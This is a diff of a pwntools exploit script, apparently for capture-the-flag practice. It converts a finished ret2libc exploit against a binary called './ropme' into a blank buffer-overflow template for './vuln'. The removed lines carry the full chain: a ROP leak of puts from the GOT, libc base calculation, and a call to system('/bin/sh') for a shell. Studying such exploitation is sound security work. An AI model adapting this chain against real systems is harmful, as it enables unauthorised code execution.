@@ -11,10 +11,11 @@ def start(argv=[], *a, **kw):
         return process([exe] + argv, *a, **kw)
 
 
+# Find offset to EIP/RIP for buffer overflows
 def find_ip(payload):
     # Launch process and send payload
     p = process(exe)
-    p.sendlineafter('?', payload)
+    p.sendlineafter('>', payload)
     # Wait for the process to crash
     p.wait()
     # Print out the address of EIP/RIP at the time of crashing
@@ -24,20 +25,19 @@ def find_ip(payload):
     return ip_offset
 
 
-# Specify your GDB script here for debugging
+# Specify GDB script here (breakpoints etc)
 gdbscript = '''
 init-pwndbg
-break main
 continue
 '''.format(**locals())
 
 
-# Set up pwntools for the correct architecture
-exe = './ropme'
+# Binary filename
+exe = './vuln'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
-# Enable verbose logging so we can see exactly what is being sent (info/debug)
-context.log_level = 'debug'
+# Change logging level to help with debugging (warning/info/debug)
+context.log_level = 'info'
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
@@ -49,44 +49,23 @@ offset = find_ip(cyclic(1000))
 # Start program
 io = start()
 
-# Our local libc
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-
-# Create ROP object from binary
-rop = ROP(elf)
-# Call puts, to leak address, then return to main
-rop.puts(elf.got.puts)
-rop.main()
-
-# Leak GOT address payload
+# Build the payload
 payload = flat({
-    offset: rop.chain()
+    offset: [
+
+    ]
 })
+
+# Save the payload to file
+write('payload', payload)
 
 # Send the payload
-io.sendlineafter('?', payload)
-io.recv()  # Receive junk
-
-# Leaked got.puts address
-got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
-info("leaked got_puts: %#x", got_puts)
-
-# Calculate libc base + update binary address
-libc.address = got_puts - libc.symbols.puts
-info("libc_base: %#x", libc.address)
-
-# Create ROP object from libc library
-rop = ROP(libc)
-# Call system, with "/bin/sh" as parameter
-rop.system(next(libc.search(b'/bin/sh\x00')))
-
-# Shell payload
-payload = flat({
-    offset: rop.chain()
-})
-
-# Exploit
-io.sendline(payload)
+io.sendlineafter('>', payload)
+io.recvuntil('Thank you!\n')
 
 # Got Shell?
 io.interactive()
+
+# Or, Get our flag!
+# flag = io.recv()
+# success(flag)
